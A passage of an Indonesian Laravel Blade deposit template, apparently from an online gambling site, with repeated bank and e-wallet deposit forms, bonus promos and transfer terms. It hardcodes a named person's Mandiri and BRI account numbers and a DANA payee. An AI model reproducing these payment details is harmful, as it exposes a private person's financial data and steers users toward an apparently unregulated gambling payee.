                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_bni"
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                                
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!-- data-min="@currency($b->minimal)"
                                                                                                data-minin="{{ $b->minimal }}"
                                                                                                 Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text" id="min_in_bni"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="50000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_bni">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                            <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text" 
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox"
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button" class="btn btn-primary"
                                                                                id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_mandiri" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation depositFormMandiri"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="3">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_mandiri">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    Bank Mandiri </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Rekening Pengirim<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8  d-flex flex-wrap">
                                                                            <select class="form-control m-15"
                                                                                name="rek_pengirim" required>
                                                                                <option disabled selected>-
                                                                                    Silakan Pilih -</option>
                                                                                <option
                                                                                    value="{{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}">
                                                                                    {{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}
                                                                                </option>
                                                                            </select>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Bank Penerima<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <select
                                                                                class="form-control bank_list m-15 has-feedback has-success"
                                                                                data-plugin="bank_list" id="bank_name_5"
                                                                                name="bank_name">
                                                                                <option selected
                                                                                    value="{{ $mandiri->nama_bank . ' - ' . $mandiri->nama_penerima }}">SANTI BERI UTAMI
                                                                                </option>
                                                                            </select>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row  info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3">
                                                                            <div class="qrcode"></div>
                                                                        </div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS :
                                                                                        <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                </div>

                                                                                <table
                                                                                    class="table table-borderless   text-right info-box--001">
                                                                                    <tbody>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Nama Akun bank </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $mandiri->nama_penerima }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">SANTI BERI UTAMI
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Rekening Bank No
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px;">
                                                                                                <input id="info-copy-2"
                                                                                                    value="{{ $mandiri->no_rek }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span
                                                                                                        style="white-space: normal; word-break: break-word;">1680003340708
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"
                                                                                                    id="min_modal_mandiri">
                                                                                                    IDR50,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6 ">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">

                                                                                                <span class="lbl">
                                                                                                    IDR 0.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_mandiri"
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                                
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!-- data-min="@currency($b->minimal)"
                                                                                                data-minin="{{ $b->minimal }}"
                                                                                                Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text" id="min_in_mandiri"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="50000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_mandiri">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                            <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text" 
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox"
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button" class="btn btn-primary"
                                                                                id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_bri" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation depositFormBri"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="4">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_bri">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    Bank BRI </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Rekening Pengirim<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8  d-flex flex-wrap">
                                                                            <select class="form-control m-15"
                                                                                name="rek_pengirim" required>
                                                                                <option disabled selected>-
                                                                                    Silakan Pilih -</option>
                                                                                <option
                                                                                    value="{{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}">
                                                                                    {{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}
                                                                                </option>
                                                                            </select>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Bank Penerima<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <select
                                                                                class="form-control bank_list m-15 has-feedback has-success"
                                                                                data-plugin="bank_list" id="bank_name_5"
                                                                                name="bank_name">
                                                                                <option selected
                                                                                    value="{{ $bri->nama_bank . ' - ' . $bri->nama_penerima }}">SANTI BERI UTAMI
                                                                                </option>
                                                                            </select>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row  info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3">
                                                                            <div class="qrcode"></div>
                                                                        </div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS :
                                                                                        <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                </div>

                                                                                <table
                                                                                    class="table table-borderless   text-right info-box--001">
                                                                                    <tbody>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Nama Akun bank </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $bri->nama_penerima }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">SANTI BERI UTAMI
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Rekening Bank No
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px;">
                                                                                                <input id="info-copy-2"
                                                                                                    value="{{ $bri->no_rek }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span
                                                                                                        style="white-space: normal; word-break: break-word;">322501005277504
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"
                                                                                                    id="min_modal_bri">
                                                                                                    IDR50,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6 ">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">

                                                                                                <span class="lbl">
                                                                                                    IDR 0.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_bri"
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                                
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!-- ,
                                                                                                Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text" id="min_in_bri"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="50000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_bri">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                            <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text" 
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox"
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button"
                                                                                class="btn btn-primary" id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_dana" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation depositFormDana"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="5">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_dana">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    DANA </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    
                                                                    <div class="row  info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3">
                                                                            <div class="qrcode"></div>
                                                                        </div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS :
                                                                                        <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                </div>
                                                                                <?php
                                                                                if(!empty($dana->image_qr)){
                                                                                    ?>
                                                                                    <!-- <img src="{{ asset('storage/logo/' . $dana->image_qr) }}" alt="" class="img_qr"> -->
                                                                                    <?php
                                                                                }
                                                                                ?>
                                                                                <table
                                                                                    class="table table-borderless   text-right info-box--001">
                                                                                    <tbody>
                                                                                        <td colspan="2" style="padding-bottom:10px">
                                                                                            <img src="https://i.ibb.co.com/7NB4kcLd/warkopgaulv212.jpg" alt="" style="display:block; margin:auto; height: 200px;">
                                                                                        </td>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Nama Akun bank </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $dana->nama_penerima }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">WARKOP GAUL
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    No. Wallet / ACCT
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr>
